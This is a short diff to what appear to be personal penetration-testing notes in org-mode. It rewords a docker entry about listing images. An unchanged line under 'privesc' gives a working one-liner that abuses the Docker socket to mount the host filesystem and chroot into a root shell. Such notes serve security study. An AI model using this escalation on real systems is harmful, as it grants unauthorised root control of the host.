@@ -109,8 +109,8 @@ In terms of network scanning, we will also look briefly at ICMP (or "ping") scan
 #+end_src
 
 * docker
-- docker images
-  : lists the docker images in system
+- list docker images
+  : docker images
 
 - privesc
   : docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
